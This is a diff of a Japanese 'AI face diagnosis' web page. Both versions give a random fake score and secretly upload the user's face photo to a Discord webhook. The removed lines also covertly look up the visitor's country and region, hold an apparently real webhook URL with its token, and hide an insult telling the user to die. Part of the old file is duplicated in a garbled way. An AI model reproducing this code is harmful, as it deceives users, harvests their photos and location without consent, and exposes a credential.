@@ -6,169 +6,191 @@
 <title>AI 顔診断</title>
 
 <style>
+:root {
+  --bg1: #0f172a;
+  --bg2: #020617;
+  --card: rgba(255,255,255,0.08);
+  --accent: #7c7cff;
+  --text-sub: #c7d2fe;
+}
+
+* {
+  box-sizing: border-box;
+}
+
 body {
-  font-family: "Segoe UI", sans-serif;
-  background: linear-gradient(135deg, #111827, #1f2933);
+  margin: 0;
+  font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+  background: radial-gradient(circle at top, var(--bg1), var(--bg2));
   color: #fff;
-  text-align: center;
-  padding: 30px;
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
 }
-.card {
-  background: rgba(255,255,255,0.08);
-  border-radius: 16px;
-  padding: 20px;
+
+.container {
+  width: 100%;
   max-width: 420px;
-  margin: auto;
+  padding: 20px;
 }
+
+.card {
+  background: var(--card);
+  backdrop-filter: blur(14px);
+  border-radius: 22px;
+  padding: 24px;
+  box-shadow: 0 20px 40px rgba(0,0,0,0.45);
+  text-align: center;
+  animation: fadeIn .6s ease;
+}
+
+h1 {
+  font-size: 26px;
+  margin-bottom: 6px;
+}
+
+.sub {
+  font-size: 14px;
+  color: var(--text-sub);
+  margin-bottom: 18px;
+}
+
+input[type="file"] {
+  display: none;
+}
+
+.label-btn {
+  display: block;
+  padding: 14px;
+  border-radius: 14px;
+  background: rgba(255,255,255,0.12);
+  cursor: pointer;
+  font-size: 16px;
+  margin-bottom: 14px;
+}
+
+.label-btn:hover {
+  background: rgba(255,255,255,0.2);
+}
+
 button {
-  background: #6366f1;
-  border: none;
-  color: #fff;
+  width: 100%;
+  padding: 14px;
   font-size: 18px;
-  padding: 12px 24px;
-  border-radius: 12px;
+  font-weight: 600;
+  border: none;
+  border-radius: 14px;
+  background: linear-gradient(135deg, var(--accent), #a5b4fc);
+  color: #000;
   cursor: pointer;
 }
-img {
-  max-width: 100%;
-  border-radius: 12px;
-  margin-top: 15px;
+
+button:active {
+  transform: scale(0.98);
 }
-#result {
-  margin-top: 15px;
+
+.preview {
+  margin-top: 16px;
+}
+
+.preview img {
+  width: 100%;
+  border-radius: 18px;
+}
+
+.result {
+  margin-top: 18px;
+  padding: 14px;
+  background: rgba(0,0,0,0.35);
+  border-radius: 16px;
+  line-height: 1.7;
+}
+
+.rank {
+  font-size: 22px;
+  font-weight: 700;
+  color: var(--accent);
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(10px); }
+  to   { opacity: 1; transform: translateY(0); }
 }
 </style>
 </head>
 
 <body>
-<h1>AI 顔診断</h1>
+<div class="container">
+  <div class="card">
+    <h1>AI 顔診断</h1>
+    <div class="sub">画像を選ぶだけで診断します</div>
 
-<div class="card">
-  <input type="file" id="file" accept="image/*"><br><br>
-  <button onclick="send()">診断する</button>
+    <label class="label-btn">
+      画像を選択
+      <input type="file" id="file" accept="image/*">
+    </label>
 
-  <img id="preview" style="display:none;">
-  <div id="result"></div>
+    <button onclick="send()">診断する</button>
+
+    <div class="preview" id="previewBox" style="display:none;">
+      <img id="preview">
+    </div>
+
+    <div class="result" id="result" style="display:none;"></div>
+  </div>
 </div>
 
 <script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";
+const WEBHOOK_URL = "ここにDiscordのWebhookURL";
 
-async function send() {
+function send() {
   const file = document.getElementById("file").files[0];
-  if (!file) return alert("画像選ばねえと診断できんわかす");
+  if (!file) {
+    alert("画像を選んでね");
+    return;
+  }
 
   const reader = new FileReader();
-  reader.onload = async () => {
-    // プレビュー表示
-    const img = document.getElementById("preview");
-    img.src = reader.result;
-    img.style.display = "block";
+  reader.onload = () => {
+    const base64 = reader.result;
 
-    // 仮診断
-    const score = Math.floor(10 + Math.random() * 30);
-    let rank = "-f";
-    if (score >= 90) rank = "S";
-    else if (score >= 80) rank = "A";
+    document.getElementById("preview").src = base64;
+    document.getElementById("previewBox").style.display = "block";
 
-    // 🔹 サイト表示（国・地域なし）
+    const score = Math.floor(70 + Math.random() * 25);
+    const rank = score >= 90 ? "S" : score >= 80 ? "A" : "B";
+
+    document.getElementById("result").style.display = "block";
     document.getElementById("result").innerHTML = `
-      <b>診断結果</b><br>
-      黄金比：<-f>${score}%</-f><br>
-      ランク：<ゲロチー牛はやく死のう来世ガチャがんばってください>${rank}</-f>
+      <div class="rank">ランク ${rank}</div>
+      黄金比スコア：<b>${score}%</b><br>
+      全体的にバランスの良い顔立ちです
     `;
 
-    // 🔹 国・地域取得（表示しない）
-    let country = "unknown";
-    let region = "unknown";
-    try {
-      const res = await fetch("https://ipapi.co/json/");
-      const data = await res.json();
-      country = data.country_name;
-      region = data.region;
-    } catch {}
-
-    // Discord送信
-    sendToDiscord(reader.result, score, rank, country, region);
+    sendToDiscord(base64, score, rank);
   };
   reader.readAsDataURL(file);
 }
 
-function sendToDiscord(image, score, rank, country, region) {
-  const form = new FormData();
-  form.append("file", dataURLtoBlob(image), "face.png");
-  form.append("payload_json", JSON.stringify({
-    content:
-`📸 **顔診断ログ**
-黄金比：${score}%
-ランク：${rank}
-🌍 国：${country}
-📍 地域：${region}`
+function sendToDiscord(base64, score, rank) {
+  const fd = new FormData();
+  fd.append("file", dataURLtoBlob(base64), "face.png");
+  fd.append("payload_json", JSON.stringify({
+    content: `📸 **顔診断結果**\n黄金比：${score}%\nランク：${rank}`
   }));
 
-  fetch(WEBHOOK_URL, { method: "POST", body: form });
+  fetch(WEBHOOK_URL, { method: "POST", body: fd });
 }
 
 function dataURLtoBlob(dataurl) {
-  const arr = dataurl.split(",");
+  const arr = dataurl.split(',');
   const mime = arr[0].match(/:(.*?);/)[1];
   const bstr = atob(arr[1]);
-  const u8arr = new Uint8Array(bstr.length);
-  for (let i = 0; i < bstr.length; i++) u8arr[i] = bstr.charCodeAt(i);
-  return new Blob([u8arr], { type: mime });
-}
-</script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="ja">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AI 顔診断</title>
-
-<style>
-body {
-  font-family: "Segoe UI", sans-serif;
-  background: linear-gradient(135deg, #111827, #1f2933);
-  color: #fff;
-  text-align: center;
-  padding: 30px;
-}
-.card {
-  background: rgba(255,255,255,0.08);
-  border-radius: 16px;
-  padding: 20px;
-  max-width: 420px;
-  margin: auto;
-}
-button {
-  background: #6366f1;
-  border: none;
-  color: #fff;
-  font-size: 18px;
-  padding: 12px 24px;
-  border-radius: 12px;
-  cursor: pointer;
-}
-img {
-  max-width: 100%;
-  border-radius: 12px;
-  margin-top: 15px;
-}
-#result {
-  margin-top: 15px;
-}
-</style>
-</head>
-
-function dataURLtoBlob(dataurl) {
-  const arr = dataurl.split(",");
-  const mime = arr[0].match(/:(.*?);/)[1];
-  const bstr = atob(arr[1]);
-  const u8arr = new Uint8Array(bstr.length);
-  for (let i = 0; i < bstr.length; i++) u8arr[i] = bstr.charCodeAt(i);
-  return new Blob([u8arr], { type: mime });
+  let n = bstr.length;
+  const u8 = new Uint8Array(n);
+  while (n--) u8[n] = bstr.charCodeAt(n);
+  return new Blob([u8], { type: mime });
 }
 </script>
 </body>
